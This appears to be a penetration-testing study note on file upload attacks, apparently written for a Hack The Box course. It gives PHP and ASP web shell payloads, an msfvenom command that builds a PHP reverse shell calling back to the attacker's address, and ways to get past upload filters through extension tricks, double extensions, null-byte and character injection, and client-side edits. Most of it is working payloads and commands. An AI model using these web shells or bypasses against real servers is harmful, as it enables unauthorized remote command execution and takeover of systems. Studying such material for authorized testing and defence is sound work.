# File upload attacks notes

## Cheat Sheets

### Web Shells

|Web Shell 	|Description|
|:----|:----|
|\<?php file_get_contents('/etc/passwd'); ?> 	|Basic PHP File Read|
|\<?php system('hostname'); ?> 	|Basic PHP Command Execution|
|\<?php system($_REQUEST['cmd']); ?> |	Basic PHP Web Shell|
|\<% eval request('cmd') %> |	Basic ASP Web Shell|
|msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php 	|Generate PHP reverse shell|
|[PHP Web Shell](https://github.com/Arrexel/phpbash)| 	PHP Web Shell|
|[PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) |	PHP Reverse Shell|
|[Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) |	List of Web Shells and Reverse Shells|

### Bypasses

|Command 	|Description|
|:----|:----|
|Client-Side |Bypass 	|
|[CTRL+SHIFT+C] |	Toggle Page Inspector|
|Blacklist Bypass 	|
|shell.phtml 	|Uncommon Extension|
|shell.pHp 	|Case Manipulation|
|[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) 	|List of PHP Extensions|
|[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) 	|List of ASP Extensions|
|[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) 	|List of Web Extensions|
|Whitelist Bypass 	|
|shell.jpg.php |	Double Extension|
|shell.php.jpg |	Reverse Double Extension|
|%20, %0a, %00, %0d0a, /, .\, ., … |	Character Injection - Before/After Extension|
|Content/Type Bypass 	|
|[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt) |	List of Web Content-Types|
|[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) 	|List of All Content-Types|
|[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 	|List of File Signatures/Magic Bytes|

### Limited Uploads

|Potential Attack 	|File Types|
|:----|:----|
|XSS 	|HTML, JS, SVG, GIF|
|XXE/SSRF |	XML, SVG, PDF, PPT, DOC|
|DoS 	|ZIP, JPG, PNG|

## Absent Validation
One easy method to determine what language runs the web application is to visit the /index.ext page, where we would swap out ext with various common web extensions, like php, asp, aspx, among others, to see whether any of them exist.

We can use a fuzzer to identify this as well

To test if we can abuse php site with a webshell we can save a file with this to upload:

```
<?php echo "Hello HTB";?>
```

## Upload exploitation

We can upload a webshell and go to it to interact with commands on the server. Using any of the above in the cheat sheets to upload or creating our own like:

```
<?php system($_REQUEST['cmd']); ?>
```

We just have to request in the url with the cmd parameter like `?cmd=id`

This is not just focused on php, .NET can also be abused with a file like this:

```
<% eval request('cmd') %>
```

### Reverse Shell

We can also upload a reverse shell and get connection that way, using something like the pentestmonkeys php reverse shell in the above cheat sheet. Just make sure to change the IP and port values in the script before uploading.

We can also craft our own reverse shells scripts with msfvenom

```
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

## Bypassing Filters

There are going to be many types of bypass stuff we should focus on 

### Client side validation

In the case where we try to upload a file and we get a response in the likes of, "Only Images are allowed!" and are blocked we can do two things
- modify the upload request to the back-end server
- manipulate the front-end code to disable these type validations

Sending a proper request with burp and sending it to repeater we can change the filetype and upload it tht way. 

To disable it we can use the browsers page inspector (shortcut: [CTRL+SHIFT+C]) and select the upload functionality section, like the user profile for a profile image upload. If there is a list of filetypes we can just add php to this. Or we can just disable any client validation steps.  

### Blacklist filters

If the site is blocking out extensions we can fuzz the upload with our extensions list from the cheat sheet above with burp intruder or ffuf

Then we just test based on the file extensions provided, not all will execute with every web config.

### Whitelist filters

This is more secure then blacklists. We do the same in fuzzing the endpoints payload. 

We can use double extensions to also bypass, putting in something like: `shell.jpg.php`

Reverse double extensions: we can also abuse regex issues with something like `shell.php.jpg`

### Character injection

Another whitelist bypass we can do is character injection. 
- %20
- %0a
- %00
- %0d0a
- /
- .\
- .
- …
- :
